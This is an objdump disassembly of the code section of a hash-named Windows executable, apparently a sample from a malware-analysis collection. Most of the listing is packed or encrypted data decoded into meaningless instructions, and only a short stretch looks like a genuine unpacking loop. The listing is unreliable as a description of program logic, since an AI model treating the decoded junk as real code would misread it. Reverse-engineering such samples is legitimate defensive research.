
b2014925201655765b7cd6a6fe24decafcefd4ee7601e1a92e76bd58f3b65328.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x413bde
  40100e:	mov    DWORD PTR [ebp-0x18],eax
  401011:	jmp    0x40141f
  401016:	adc    BYTE PTR [ebp+esi*8-0x5e940e36],0x54
  40101e:	(bad)  
  40101f:	shr    DWORD PTR ds:0xa377d508,cl
  401025:	push   0x7e7e7e7e
  40102a:	outs   dx,DWORD PTR ds:[esi]
  40102b:	jge    0x4010ab
  40102d:	jle    0x400ffd
  40102f:	xlat   BYTE PTR ds:[ebx]
  401030:	cmp    eax,0xcfd339d5
  401035:	rol    eax,1
  401037:	pop    es
  401038:	add    al,0x3
  40103a:	add    DWORD PTR [esi+0xf330f00],ecx
  401040:	rcr    BYTE PTR [eax],0xc7
  401043:	adc    BYTE PTR [edi],bl
  401045:	mov    ecx,0xddb70058
  40104a:	push   cs
  40104b:	out    dx,eax
  40104c:	mov    ebp,0x8e03d6db
  401051:	es mov esi,0x1541a2f4
  401057:	lods   eax,DWORD PTR ds:[esi]
  401058:	fiadd  WORD PTR [esi+0x1f]
  40105b:	data16 in al,dx
  40105d:	outs   dx,DWORD PTR ds:[esi]
  40105e:	or     edx,DWORD PTR [ecx]
  401060:	pushf  
  401061:	js     0x401039
  401063:	inc    eax
  401064:	stos   BYTE PTR es:[edi],al
  401065:	push   ebx
  401066:	sub    eax,0xad3cc4d1
  40106b:	mov    bh,BYTE PTR [ebx-0x3b]
  40106e:	stos   DWORD PTR es:[edi],eax
  40106f:	push   es
  401070:	(bad)  
  401071:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401077:	jmp    0x4010a9
  401079:	mov    ebp,ecx
  40107b:	dec    edi
  40107c:	out    0xa6,al
  40107e:	inc    ecx
  40107f:	call   DWORD PTR [edi-0x2556f868]
  401085:	mov    ebp,0x5536ed4d
  40108a:	and    esi,DWORD PTR [edx-0x43619116]
  401090:	jnp    0x4010a3
  401092:	ret    
  401093:	xchg   edx,eax
  401094:	and    esp,edx
  401096:	jmp    0x4010f6
  401098:	ret    0xb8e4
  40109b:	lock jmp 0xd765:0x74cf3192
  4010a3:	and    ch,cl
  4010a5:	add    bl,cl
  4010a7:	adc    DWORD PTR [ecx-0x5a],edx
  4010aa:	xor    eax,0x78616f03
  4010af:	or     BYTE PTR [ecx],dh
  4010b1:	fisttp QWORD PTR [esi+0x7f752854]
  4010b7:	(bad)
  4010bc:	or     ebx,DWORD PTR [ebx+0x55]
  4010bf:	fst    st(6)
  4010c1:	or     ebx,edx
  4010c3:	pop    esp
  4010c4:	fstp   DWORD PTR [ecx]
  4010c6:	jno    0x401066
  4010c8:	inc    esi
  4010c9:	dec    ebx
  4010ca:	aaa    
  4010cb:	adc    eax,0x1a29772b
  4010d0:	sar    DWORD PTR [esi],cl
  4010d2:	dec    edi
  4010d3:	call   0x3e00b5a5
  4010d8:	push   0xe44144e8
  4010dd:	xchg   esp,eax
  4010de:	and    BYTE PTR [eax-0x1bde67b2],cl
  4010e4:	fs add esi,0x569079ac
  4010eb:	sub    al,0xbb
  4010ed:	test   eax,0xad17c190
  4010f2:	mov    fs,WORD PTR [ecx+eax*2-0x379da3c1]
  4010f9:	dec    esp
  4010fa:	mov    eax,0xb47e5830
  4010ff:	stc    
  401100:	fisubr WORD PTR [edx+0xc]
  401103:	cmp    ebp,DWORD PTR [ebx+edx*1+0x7b]
  401107:	(bad)  
  401108:	mov    ebx,0x5b3f3417
  40110d:	arpl   WORD PTR ds:[eax+0x41a10519],ax
  401114:	mov    esp,0x6c4beddc
  401119:	jns    0x401179
  40111b:	mov    edi,0x4804cb44
  401120:	push   0x96ae0f43
  401125:	mov    ch,0xc8
  401127:	into   
  401128:	cmp    BYTE PTR [ecx-0x6ae1c3c8],0xb3
  40112f:	dec    edx
  401130:	ins    BYTE PTR es:[edi],dx
  401131:	sub    DWORD PTR [ebx],esi
  401133:	sub    DWORD PTR ds:0xabf77a78,ecx
  401139:	jg     0x4010d0
  40113b:	xchg   esi,eax
  40113c:	and    al,0xd1
  40113e:	loop   0x401108
  401140:	sub    eax,0x6e1e42f2
  401145:	sub    eax,0x7e435424
  40114a:	fisubr DWORD PTR [edi+0x7b2c5918]
  401150:	arpl   WORD PTR [esi+eax*8-0x3197d9ce],dx
  401157:	jge    0x401100
  401159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40115a:	sub    ebp,DWORD PTR [ecx-0x8]
  40115d:	inc    esp
  40115e:	cmc    
  40115f:	imul   ebp,DWORD PTR [ebx],0xffffff95
  401162:	xchg   esp,eax
  401163:	adc    dh,dh
  401165:	test   edi,eax
  401167:	gs (bad) 
  401169:	int3   
  40116a:	cwde   
  40116b:	ins    BYTE PTR es:[edi],dx
  40116c:	in     al,dx
  40116d:	shl    BYTE PTR [ecx-0x3d8e80ad],1
  401173:	call   0xd4a51798
  401178:	pop    ss
  401179:	xchg   esi,eax
  40117b:	jecxz  0x40110a
  40117d:	sub    BYTE PTR [edi],ah
  40117f:	mov    dh,0xb2
  401181:	push   edx
  401182:	sub    ebp,edi
  401184:	(bad)  
  401185:	loope  0x401152
  401187:	out    dx,al
  401188:	fcomp  QWORD PTR [esi-0x5c10ca7d]
  40118e:	(bad)  
  40118f:	xchg   edi,eax
  401190:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  401192:	jae    0x4011e5
  401194:	adc    eax,0xfd3fa7f8
  401199:	and    dh,bl
  40119b:	sub    al,0x26
  40119d:	stos   BYTE PTR es:[edi],al
  40119e:	rol    BYTE PTR [ebx],0x7c
  4011a1:	add    DWORD PTR [ebp-0x465823ae],ebp
  4011a7:	inc    ecx
  4011a8:	rcr    BYTE PTR [edx-0x41],1
  4011ab:	xchg   al,ah
  4011ad:	outs   dx,BYTE PTR ds:[esi]
  4011ae:	add    ecx,DWORD PTR [ecx+0x2856773]
  4011b4:	add    cl,BYTE PTR [esi+0x62aca60f]
  4011ba:	gs gs aad 0x22
  4011be:	test   eax,0xc8c6bb8c
  4011c3:	inc    eax
  4011c4:	mov    dl,0x84
  4011c6:	xchg   ebp,eax
  4011c7:	lods   eax,DWORD PTR ds:[esi]
  4011c8:	call   0xcfdf:0xf386ce2d
  4011cf:	je     0x4011ca
  4011d1:	daa    
  4011d2:	inc    ecx
  4011d3:	dec    eax
  4011d4:	fsubr  QWORD PTR [eax-0x69]
  4011d7:	outs   dx,BYTE PTR ds:[esi]
  4011d8:	xlat   BYTE PTR ds:[ebx]
  4011d9:	adc    al,0xaa
  4011db:	inc    esp
  4011dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4011dd:	sbb    ecx,ecx
  4011df:	xor    al,0x16
  4011e1:	jmp    0x7fecc870
  4011e6:	ret    
  4011e7:	add    al,0xa
  4011e9:	in     eax,dx
  4011ea:	in     al,0x52
  4011ec:	rol    BYTE PTR [edi-0x304e4bf6],1
  4011f2:	mov    esi,0x23a77a88
  4011f7:	jb     0x4011ff
  4011f9:	adc    al,0x8c
  4011fb:	in     eax,0x22
  4011fd:	sbb    ch,BYTE PTR [ecx-0x47cd3396]
  401203:	dec    eax
  401204:	pop    edx
  401205:	test   DWORD PTR [edx+0x1380b935],0xc053ef58
  40120f:	clc    
  401210:	xlat   BYTE PTR ds:[ebx]
  401211:	xor    DWORD PTR [edi+0x1f],eax
  401214:	pop    ss
  401215:	in     eax,dx
  401216:	daa    
  401217:	int    0x50
  401219:	add    DWORD PTR [ebp+ecx*1+0x34cc8e5],ebx
  401220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401221:	and    ebx,DWORD PTR [ebp+0x5bb0900c]
  401227:	push   esi
  401228:	push   ss
  401229:	repnz pop esi
  40122b:	test   al,0x80
  40122d:	xchg   ebp,eax
  40122e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40122f:	mov    edi,0xa83d9c45
  401234:	mov    edi,0x6981a5ad
  401239:	jne    0x401252
  40123b:	arpl   WORD PTR [edx],sp
  40123d:	mov    edi,0xd6e9bb27
  401242:	pop    eax
  401243:	dec    esp
  401244:	es pusha 
  401246:	(bad)  
  401248:	pop    ss
  401249:	je     0x401287
  40124b:	jp     0x40125a
  40124d:	mov    ds:0x2949c0b9,eax
  401252:	and    dh,BYTE PTR [ebx-0x33]
  401255:	loope  0x401257
  401257:	lds    esp,FWORD PTR [edx]
  401259:	ret    
  40125a:	push   0xffffffd2
  40125c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40125d:	push   0x42
  40125f:	ds mov ebp,0xaef590be
  401265:	xlat   BYTE PTR ds:[ebx]
  401266:	fsub   QWORD PTR [edx+0x66908706]
  40126c:	jns    0x4011f6
  40126e:	or     eax,0x840ec212
  401273:	jnp    0x40125a
  401275:	or     dh,BYTE PTR [edi+0x55]
  401278:	retf   0x8309
  40127b:	inc    edx
  40127c:	add    BYTE PTR [ebp-0x1f6b2afc],al
  401282:	add    ah,ah
  401284:	pop    eax
  401285:	cdq    
  401286:	hlt    
  401287:	cdq    
  401288:	out    dx,eax
  401289:	loop   0x4012af
  40128b:	cmc    
  40128c:	pop    esp
  40128d:	loop   0x40122e
  40128f:	jnp    0x401213
  401291:	cmp    cl,BYTE PTR [esp+ebp*4]
  401294:	in     eax,0x51
  401296:	mov    bl,0x92
  401298:	imul   ebx,edi,0x15f0bbd5
  40129e:	add    al,0x7a
  4012a0:	sbb    dh,BYTE PTR [ebp+0x4ecffb2f]
  4012a6:	lock imul edi,DWORD PTR [ecx+esi*1-0x1a],0x5ec844fb
  4012af:	add    esp,DWORD PTR [ebx]
  4012b1:	inc    BYTE PTR [eax+0x11]
  4012b4:	push   es
  4012b5:	(bad)
  4012bb:	aas    
  4012bc:	xchg   edi,eax
  4012bd:	adc    dl,0xb2
  4012c0:	fwait
  4012c1:	mov    al,ds:0x5e84b4d4
  4012c6:	fwait
  4012c7:	and    bl,cl
  4012c9:	aaa    
  4012ca:	sub    edx,DWORD PTR [ebx-0x724d5525]
  4012d0:	pop    ss
  4012d1:	icebp  
  4012d2:	mov    BYTE PTR [ebp+0x6a],cl
  4012d5:	outs   dx,BYTE PTR ds:[esi]
  4012d6:	call   0x8d84e979
  4012db:	add    BYTE PTR [eax],ch
  4012dd:	test   eax,0xa6d07625
  4012e2:	retf   
  4012e3:	dec    esp
  4012e4:	retf   0xa77a
  4012e7:	cmp    BYTE PTR [edx+0x6c94f7e5],bl
  4012ed:	inc    esi
  4012ee:	popf   
  4012ef:	push   eax
  4012f0:	xchg   ebx,eax
  4012f1:	iret   
  4012f2:	pop    edx
  4012f3:	push   0x1b
  4012f5:	lods   al,BYTE PTR ds:[esi]
  4012f6:	stos   BYTE PTR es:[edi],al
  4012f7:	and    eax,esi
  4012f9:	add    ch,BYTE PTR [ebx-0x565eb971]
  4012ff:	xchg   ebp,eax
  401300:	mov    ecx,0x9a9ea532
  401305:	jnp    0x4012fe
  401307:	inc    ebx
  401308:	and    ecx,ebp
  40130a:	cmp    al,0x73
  40130c:	cmp    DWORD PTR [eax],ecx
  40130e:	xor    eax,0x13dce471
  401313:	cmp    DWORD PTR [eax+0x1865b83c],ebp
  401319:	xor    al,0x82
  40131b:	loope  0x401331
  40131d:	cmp    DWORD PTR [ecx+eiz*4],ebp
  401320:	dec    edx
  401321:	sbb    eax,ebx
  401323:	mov    ah,BYTE PTR [esi]
  401325:	ror    bl,1
  401327:	mov    al,0x6
  401329:	scas   al,BYTE PTR es:[edi]
  40132a:	cli    
  40132b:	cdq    
  40132c:	repz ficomp WORD PTR [edi+0x20]
  401330:	xor    DWORD PTR [edi-0x58],ebx
  401333:	cmp    edx,DWORD PTR [edx-0x790a7db]
  401339:	adc    ebp,DWORD PTR [edx+edi*2+0x3c16c89e]
  401340:	mov    eax,ds:0x6c71ff71
  401345:	ror    ah,1
  401347:	cmp    DWORD PTR [edx],edx
  401349:	je     0x401381
  40134b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40134c:	sti    
  40134d:	sub    BYTE PTR [eax+0x21],dl
  401350:	scas   eax,DWORD PTR es:[edi]
  401351:	jbe    0x40131c
  401353:	pop    esp
  401354:	lds    ebp,FWORD PTR [ebx]
  401356:	mov    ebx,0x3784bbb1
  40135b:	mov    ebx,0x3519adf9
  401360:	ss pop es
  401362:	sub    ebp,0xe3f40b70
  401368:	shl    ebx,0xd6
  40136b:	lods   al,BYTE PTR ds:[esi]
  40136c:	fucomp st(7)
  40136e:	or     BYTE PTR [ebx],al
  401370:	mov    ah,0x3b
  401372:	stos   DWORD PTR es:[edi],eax
  401373:	bound  ebp,QWORD PTR [edx]
  401375:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401376:	adc    dl,dh
  401378:	call   0xb3b5:0xd811f50d
  40137f:	aaa    
  401380:	rcr    ecx,cl
  401382:	js     0x4013f8
  401384:	daa    
  401385:	sub    ah,BYTE PTR [esi-0x17]
  401388:	jmp    0x8202:0x62a1d548
  40138f:	std    
  401390:	repz pop esi
  401392:	jmp    0x11fcf748
  401397:	push   cs
  401398:	mov    eax,ds:0x3e4dadec
  40139d:	dec    eax
  40139e:	and    cl,BYTE PTR [ebx+eax*1]
  4013a1:	retf   0x862e
  4013a4:	or     DWORD PTR [ebp+0x20425bf3],0xb2caed8e
  4013ae:	mov    eax,ds:0xc406c1d8
  4013b3:	push   edi
  4013b4:	xchg   edx,eax
  4013b5:	arpl   WORD PTR [ecx-0x19],bx
  4013b8:	adc    DWORD PTR [edx-0x4150f84f],0xffffffff
  4013bf:	aaa    
  4013c0:	retf   0xa1ac
  4013c3:	sbb    eax,0x4b7f750a
  4013c8:	jg     0x401444
  4013ca:	sub    esp,0x753aa2af
  4013d0:	dec    edi
  4013d1:	and    al,0x4b
  4013d3:	iret   
  4013d4:	and    DWORD PTR [eax+ebx*8-0x3a],0xdb37f8d2
  4013dc:	push   ds
  4013dd:	xchg   ecx,eax
  4013de:	setle  BYTE PTR [edx-0x60]
  4013e2:	mov    edx,eax
  4013e4:	jecxz  0x4013b0
  4013e6:	mov    al,ds:0xb72c9a47
  4013eb:	cld    
  4013ec:	lods   eax,DWORD PTR ds:[esi]
  4013ed:	bound  ebp,QWORD PTR [edx-0x59]
  4013f0:	leave  
  4013f1:	jmp    0xbdd34318
  4013f6:	push   0x7cccc7bc
  4013fb:	test   BYTE PTR [ecx-0x5b47b8e0],ch
  401401:	inc    dl
  401403:	daa    
  401404:	mov    esp,0x520d0872
  401409:	jnp    0x4013b8
  40140b:	sbb    cl,BYTE PTR [eax+0x29]
  40140e:	jno    0x401461
  401410:	xchg   edx,eax
  401411:	jnp    0x40143e
  401413:	rcl    BYTE PTR [ecx+0x7020061],cl
  401419:	dec    ebp
  40141a:	sub    ah,BYTE PTR [ebx+0x11]
  40141d:	inc    DWORD PTR [edi+0x413ceea1]
  401423:	add    BYTE PTR [ecx+0x45c7b845],cl
  401429:	lock xor DWORD PTR [ebp+0x1315f89c],eax
  401430:	pusha  
  401431:	add    BYTE PTR [eax],al
  401433:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  40143a:	adc    eax,ecx
  40143c:	mov    eax,DWORD PTR [ebp-0x10]
  40143f:	mov    ecx,DWORD PTR ds:0x43374b
  401445:	mov    ecx,DWORD PTR [ecx]
  401447:	or     DWORD PTR ds:0x433773,ecx
  40144d:	push   ebx
  40144e:	push   esi
  40144f:	sbb    DWORD PTR ds:0x4337eb,edi
  401455:	mov    esi,0x7510854
  40145a:	movzx  ecx,BYTE PTR ds:0x4337f3
  401461:	sbb    DWORD PTR ds:0x4337ef,ecx
  401467:	xor    eax,esi
  401469:	and    ebx,ecx
  40146b:	push   edi
  40146c:	mov    DWORD PTR ds:0x433843,0x1c
  401476:	cmp    DWORD PTR ds:0x433843,0x0
  40147d:	je     0x4014ab
  401483:	cmp    DWORD PTR ds:0x433843,0x25
  40148a:	jne    0x401499
  401490:	push   DWORD PTR [ebp-0x20]
  401493:	call   DWORD PTR ds:0x412288
  401499:	mov    ebx,DWORD PTR ds:0x433843
  40149f:	dec    ebx
  4014a0:	mov    DWORD PTR ds:0x433843,ebx
  4014a6:	jmp    0x401476
  4014ab:	mov    edi,0x32729b
  4014b0:	jmp    0x4018be
  4014b5:	xchg   ecx,eax
  4014b6:	mov    ds:0x59f479c4,eax
  4014bb:	push   ecx
  4014bc:	mov    bl,0x68
  4014be:	push   ebp
  4014bf:	out    dx,eax
  4014c0:	xor    ebx,DWORD PTR [edi-0x7c]
  4014c3:	xor    esi,DWORD PTR [ecx]
  4014c5:	outs   dx,DWORD PTR ds:[esi]
  4014c6:	jge    0x401546
  4014c8:	jle    0x401539
  4014ca:	jge    0x40154a
  4014cc:	jle    0x4014e6
  4014ce:	shr    BYTE PTR [ebp+eax*1+0x42],0x6
  4014d3:	imul   esi,DWORD PTR [eax+0x3140e94f],0xd017a9b8
  4014dd:	dec    ecx
  4014de:	xchg   BYTE PTR [edx+0x58],cl
  4014e1:	or     DWORD PTR [esi+0x293f0ba6],0xffffff8f
  4014e8:	fidiv  WORD PTR ds:0xdc60f904
  4014ee:	cmp    eax,0xf12f69ad
  4014f3:	jb     0x4014c7
  4014f5:	jmp    0xf1dc6b6a
  4014fa:	shl    eax,1
  4014fc:	mov    ds:0x3dd186d8,al
  401501:	adc    al,0x1f
  401503:	mov    al,ds:0x7b521c97
  401508:	dec    ecx
  401509:	hlt    
  40150a:	scas   eax,DWORD PTR es:[edi]
  40150b:	pop    eax
  40150c:	adc    eax,0x19ed3990
  401511:	aad    0x76
  401513:	push   0xb37d71fa
  401518:	jmp    0x4e81abc
  40151d:	mov    eax,ds:0xcacb48af
  401522:	lods   eax,DWORD PTR ds:[esi]
  401523:	cmp    al,0x9d
  401525:	ds es stos BYTE PTR es:[edi],al
  401528:	out    dx,eax
  401529:	or     eax,0xba834fb2
  40152e:	mov    ecx,0xfe1e33e7
  401533:	sub    DWORD PTR [ecx+0x2334f8e5],0xffffffdb
  40153a:	cmc    
  40153b:	jmp    0x401514
  40153d:	pusha  
  40153e:	and    ebx,DWORD PTR [ebp-0x3bbc1650]
  401544:	arpl   ax,bx
  401546:	pop    ebp
  401547:	push   edi
  401548:	mov    ds:0x487ef29b,al
  40154d:	jbe    0x4014ee
  40154f:	test   BYTE PTR [edx+eiz*2+0x2c],dh
  401553:	mov    ecx,DWORD PTR [esi+edx*4-0x34]
  401557:	sub    ah,dl
  401559:	out    0xc5,eax
  40155b:	xchg   ecx,eax
  40155c:	push   ebx
  40155d:	sbb    bh,BYTE PTR [ebx-0x75cfc944]
  401563:	cmp    al,0xaf
  401565:	mov    DWORD PTR [eax],eax
  401567:	out    dx,eax
  401568:	push   ebx
  401569:	dec    esp
  40156a:	inc    eax
  40156b:	cmp    DWORD PTR [ebp-0x3f03e530],ecx
  401571:	nop    DWORD PTR [eax+0x462a8d8]
  401578:	cmp    ebp,DWORD PTR [esi-0x7e]
  40157b:	mov    ah,0xf2
  40157d:	rcr    BYTE PTR [eax],cl
  40157f:	fnsave [edx-0x44df4132]
  401585:	(bad)  
  401586:	adc    eax,0xac2f330c
  40158b:	(bad)  
  40158d:	mov    ds:0xe18d9e5,al
  401592:	scas   eax,DWORD PTR es:[edi]
  401593:	sub    al,0x8
  401595:	dec    ebx
  401596:	push   ebx
  401597:	test   BYTE PTR [edx+0x6eb7dd98],bl
  40159d:	in     eax,0x86
  40159f:	sub    DWORD PTR [ebx+0x3dd0a58f],ebx
  4015a5:	inc    esp
  4015a6:	imul   ebx,DWORD PTR [edi],0x8175fb46
  4015ac:	popa   
  4015ad:	mov    ecx,0x289f7632
  4015b2:	popa   
  4015b3:	mov    edi,DWORD PTR [ecx]
  4015b5:	xchg   ebx,eax
  4015b6:	call   DWORD PTR [edi-0xc82728b]
  4015bc:	outs   dx,BYTE PTR ds:[esi]
  4015bd:	ret    
  4015be:	xor    eax,0xc748bf45
  4015c3:	aam    0x52
  4015c5:	rol    edi,1
  4015c7:	add    al,0xdd
  4015c9:	sti    
  4015ca:	aas    
  4015cb:	ss push edx
  4015cd:	repnz arpl WORD PTR [edi],si
  4015d0:	(bad)  
  4015d1:	outs   dx,DWORD PTR ds:[esi]
  4015d2:	int3   
  4015d3:	jns    0x401555
  4015d5:	jmp    0x3f89:0x42362ce7
  4015dc:	rcr    BYTE PTR [edx],1
  4015de:	pop    eax
  4015df:	ins    DWORD PTR es:[edi],dx
  4015e0:	add    ah,al
  4015e2:	adc    ecx,esi
  4015e4:	dec    ebp
  4015e5:	mov    ecx,0x1ccd5ba8
  4015ea:	and    esp,DWORD PTR [edx+ebp*2+0x3fb00233]
  4015f1:	sti    
  4015f2:	imul   edx,DWORD PTR gs:0x1d9fea9f,0x6620f567
  4015fd:	imul   ebp,DWORD PTR [edi],0x261e7c2e
  401603:	daa    
  401604:	push   eax
  401605:	mov    eax,0x665dd736
  40160a:	and    ch,BYTE PTR [eax-0x28561510]
  401610:	nop
  401611:	stc    
  401612:	adc    eax,0xfc11fe
  401617:	rol    DWORD PTR [eax-0x59],cl
  40161a:	ds ret 
  40161c:	push   ebx
  40161d:	nop
  40161e:	ret    
  40161f:	int3   
  401620:	out    0x1b,al
  401622:	int    0x56
  401624:	jo     0x401620
  401626:	sub    BYTE PTR [edi],cl
  401628:	jae    0x4015bd
  40162a:	mov    edi,0x42351ab5
  40162f:	in     al,dx
  401630:	adc    cl,ch
  401632:	stos   DWORD PTR es:[edi],eax
  401633:	push   edi
  401634:	adc    BYTE PTR [edi+0x24881c3d],ah
  40163a:	dec    ebx
  40163b:	cs inc eax
  40163d:	jle    0x401613
  40163f:	sbb    BYTE PTR [esi],bl
  401641:	and    ecx,DWORD PTR [edi-0x4cc3dfd6]
  401647:	pusha  
  401648:	out    0xf9,al
  40164a:	jmp    0x4015e9
  40164c:	in     eax,dx
  40164d:	int    0xa3
  40164f:	in     eax,0x65
  401651:	xchg   edi,eax
  401652:	(bad)  
  401653:	mov    bl,0x51
  401655:	arpl   WORD PTR [ebx],bp
  401657:	add    ebx,DWORD PTR [ebp-0x16]
  40165a:	pop    es
  40165b:	xchg   ebp,eax
  40165c:	popf   
  40165d:	(bad)
  401661:	dec    ebx
  401662:	std    
  401663:	rol    ebx,cl
  401665:	ins    BYTE PTR es:[edi],dx
  401666:	push   esp
  401667:	aam    0x7c
  401669:	pop    ss
  40166a:	test   al,0x93
  40166c:	xchg   ecx,eax
  40166d:	loop   0x401655
  40166f:	mov    dh,0x27
  401671:	jl     0x4016d4
  401673:	pop    edx
  401674:	cld    
  401675:	push   esi
  401676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401677:	jno    0x4016e5
  401679:	xor    BYTE PTR [ebx-0x23],dh
  40167c:	mov    es,eax
  40167e:	inc    edx
  40167f:	dec    eax
  401680:	adc    al,0xfa
  401682:	data16 jp 0x4016e4
  401685:	mov    edi,0x3e453caf
  40168a:	adc    bh,BYTE PTR [eax+0x60]
  40168d:	cmp    dh,BYTE PTR [ebp+0x114f8ba5]
  401693:	in     eax,dx
  401694:	push   cs
  401695:	and    edi,0x7
  401698:	jg     0x401640
  40169a:	mov    ebp,?
  40169c:	ficom  DWORD PTR [ebp+ebp*8+0x7e]
  4016a0:	int    0x91
  4016a2:	xor    dh,dl
  4016a4:	mov    ecx,0x390a261d
  4016a9:	xor    eax,0x3d3fa4aa
  4016ae:	add    DWORD PTR [ebp-0x42],ebp
  4016b1:	stc    
  4016b2:	jle    0x4016c0
  4016b4:	push   edi
  4016b5:	adc    eax,0xf61d287e
  4016ba:	pop    ebx
  4016bb:	repnz cmp eax,0x8980390c
  4016c1:	adc    DWORD PTR [ebx+0x14],esp
  4016c4:	in     eax,dx
  4016c5:	stos   BYTE PTR es:[edi],al
  4016c6:	fist   WORD PTR [edx]
  4016c8:	fdiv   QWORD PTR [esi-0x33afac0]
  4016ce:	loopne 0x401670
  4016d0:	adc    DWORD PTR [edx+esi*8+0x234a79d0],esi
  4016d7:	pop    es
  4016d8:	(bad)  
  4016d9:	xchg   ebp,eax
  4016da:	dec    esp
  4016db:	cli    
  4016dc:	aad    0xfa
  4016de:	iret   
  4016df:	cmp    dh,dh
  4016e1:	in     eax,0x2d
  4016e3:	or     DWORD PTR [bx-0x62d9],ecx
  4016e8:	mov    esi,0x885fbdd4
  4016ed:	jmp    0xcc528877
  4016f2:	out    0x95,al
  4016f4:	mov    bh,0xc9
  4016f6:	pop    ecx
  4016f7:	jns    0x401714
  4016f9:	adc    BYTE PTR [ecx+0x6247cd7a],al
  4016ff:	scas   al,BYTE PTR es:[edi]
  401700:	lds    esp,FWORD PTR [edx]
  401702:	sub    dl,BYTE PTR [eax]
  401704:	sti    
  401705:	je     0x401738
  401707:	mov    ebp,DWORD PTR [ebp-0x38]
  40170a:	popa   
  40170b:	cli    
  40170c:	call   0xf1c7:0xbcf23582
  401713:	js     0x4016ad
  401715:	pop    edx
  401716:	add    eax,0xe92fccb1
  40171b:	dec    eax
  40171c:	in     al,dx
  40171d:	or     dl,al
  40171f:	retf   
  401720:	mov    ds:0x3ae5cd06,al
  401725:	cwde   
  401726:	add    DWORD PTR [ebp-0x1bc49ed9],edx
  40172c:	mov    eax,0xfc01b0e4
  401731:	pop    eax
  401732:	adc    al,0x50
  401734:	cmp    edi,DWORD PTR [edx+0xd31632a]
  40173a:	jg     0x40171c
  40173c:	xlat   BYTE PTR ds:[ebx]
  40173d:	cmp    al,BYTE PTR [ebx]
  40173f:	xchg   ebx,eax
  401740:	jmp    0x401744
  401742:	imul   edx,eax,0x32626bf3
  401748:	dec    ebx
  401749:	pop    ecx
  40174a:	test   al,0xf5
  40174c:	test   DWORD PTR [ebx],esp
  40174e:	call   0xff88:0x6273f3ca
  401755:	scas   eax,DWORD PTR es:[edi]
  401756:	mov    ch,0xa1
  401758:	retf   
  401759:	xchg   edx,eax
  40175b:	or     edi,ebp
  40175d:	aam    0xc0
  40175f:	sub    bh,BYTE PTR [edi+0x5b]
  401762:	xchg   edx,eax
  401763:	lock sahf 
  401765:	push   esp
  401766:	dec    ebx
  401767:	ja     0x40171e
  401769:	adc    BYTE PTR [edx+0x101a8557],ch
  40176f:	xor    edx,DWORD PTR [ebp-0x10]
  401772:	daa    
  401773:	add    eax,0x8333fe51
  401778:	adc    al,0x6e
  40177a:	mov    ch,0x63
  40177c:	stos   BYTE PTR es:[edi],al
  40177d:	(bad)  
  40177f:	sbb    al,0x75
  401781:	aas    
  401782:	je     0x40173c
  401784:	mov    al,ds:0xd43d463b
  401789:	popf   
  40178a:	mov    WORD PTR [ebx],gs
  40178c:	and    ebp,esi
  40178e:	fwait
  40178f:	jo     0x401792
  401791:	jmp    0x2f88:0xeec064f0
  401798:	pusha  
  401799:	test   esp,0xf5b39991
  40179f:	xchg   edx,eax
  4017a0:	sub    eax,0xb103b34b
  4017a5:	adc    BYTE PTR [edx-0x1561870f],bl
  4017ab:	data16 mov al,0xda
  4017ae:	fstp   DWORD PTR [edi]
  4017b0:	bound  ecx,QWORD PTR [esi+0x75408915]
  4017b6:	mov    DWORD PTR [esi-0x70],0xcd9dd457
  4017bd:	pop    ss
  4017be:	int3   
  4017bf:	icebp  
  4017c0:	(bad)  [edi+0x42]
  4017c3:	ins    BYTE PTR es:[edi],dx
  4017c4:	fadd   st,st(6)
  4017c6:	lahf   
  4017c7:	lds    eax,FWORD PTR [esi+eiz*8-0x7ff3da82]
  4017ce:	sub    al,0x81
  4017d0:	add    DWORD PTR [ecx],edx
  4017d2:	dec    ebx
  4017d3:	xchg   edi,eax
  4017d4:	sub    BYTE PTR [ebx-0x18],dh
  4017d7:	dec    edx
  4017d8:	loope  0x4017b9
  4017da:	or     ebp,0x3c
  4017dd:	adc    DWORD PTR [eax-0xa05c909],edx
  4017e3:	adc    DWORD PTR [esi-0x7c1910b3],esp
  4017e9:	xor    BYTE PTR [edx],0xb6
  4017ec:	dec    edi
  4017ed:	stc    
  4017ee:	ja     0x40178f
  4017f0:	mov    cl,dl
  4017f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017f3:	fcom   QWORD PTR [ecx]
  4017f5:	test   al,0x2
  4017f7:	out    dx,eax
  4017f8:	pop    ss
  4017f9:	mov    ebx,0xc812ce94
  4017fe:	in     al,0x1
  401800:	sub    ebx,DWORD PTR ds:0x6a435185
  401806:	int3   
  401807:	jb     0x40184d
  401809:	add    DWORD PTR [eax],0x45346a90
  40180f:	aas    
  401810:	mov    ds:0xe92a7435,eax
  401815:	retf   0x426d
  401818:	xchg   ebx,eax
  401819:	fldcw  WORD PTR [eax]
  40181b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40181c:	sub    ah,BYTE PTR ds:0x65c9a9a2
  401822:	mov    ds:0x71361cf6,al
  401827:	mov    cl,0xdd
  401829:	mov    bl,0xd6
  40182b:	mov    cs,WORD PTR es:[edx+ebx*1+0x6f]
  401830:	cmp    eax,0xe84e4a3e
  401835:	out    dx,al
  401836:	out    0x88,eax
  401838:	and    bl,BYTE PTR [esi-0x5a]
  40183b:	leave  
  40183c:	add    al,0x1f
  40183e:	add    DWORD PTR [edx+eax*1],ecx
  401841:	addr16 mov eax,0x23da999c
  401847:	test   BYTE PTR [ecx+eiz*1-0x5704f478],bh
  40184e:	dec    edx
  40184f:	push   eax
  401850:	cli    
  401851:	mov    cl,0x35
  401853:	pop    ebp
  401854:	test   BYTE PTR [ebx+0x4428134c],dl
  40185a:	lock je 0x4017ff
  40185d:	std    
  40185e:	out    dx,eax
  40185f:	lds    edi,FWORD PTR [esi]
  401861:	clc    
